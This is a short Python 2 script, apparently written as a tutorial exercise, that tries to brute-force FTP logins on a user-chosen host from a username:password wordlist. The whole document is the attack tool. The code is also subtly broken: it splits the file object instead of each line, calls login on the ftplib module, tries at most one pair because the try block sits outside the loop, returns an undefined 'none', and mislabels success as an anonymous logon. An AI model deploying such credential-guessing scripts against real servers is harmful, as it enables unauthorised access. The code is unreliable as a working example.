import ftplib

def bruteLogin(hostname,passwdFile):
	
	pF=open(passwdFile,'r')

	for line in pF.readlines():
		username=pF.split(':')[0]
		password=pF.split(':')[1].strip('\n')
		print "[+] Trying "+ username + password
	try:
		ftp=ftplib.FTP(hostname)
		ftplib.login(username,password)
		print "\n[+]" + str(hostname) + "Anonymous Logon Succeeded: " + username + password
		ftplib.quit()
		return (username,password)


	except Exception,e:
		pass
	print "[-] Could not bruteforce FTP Credentials"
	return (none,none)

host=raw_input("Enter target host:")
password=raw_input("Enter wordlist file:")
bruteLogin(host,password)
